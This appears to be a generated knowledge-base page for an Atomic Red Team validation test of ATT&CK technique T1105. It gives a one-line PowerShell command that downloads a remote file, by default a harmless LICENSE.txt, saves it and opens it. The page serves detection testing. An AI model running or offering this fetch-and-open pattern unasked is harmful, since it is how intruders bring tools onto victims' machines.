---
atomic_guid: "54a4daf1-71df-4383-9ba7-f1a295d8b6d2"
title: "File Download via PowerShell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "54a4daf1-71df-4383-9ba7-f1a295d8b6d2"
  - "File Download via PowerShell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# File Download via PowerShell

Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.

## Metadata

- Atomic GUID: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2
- Technique: T1105: Ingress Tool Transfer
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### output_file

- description: File to write to
- type: string
- default: LICENSE.txt

### target_remote_file

- description: File to download
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt

## Executor

- name: powershell

### Command

```powershell
(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
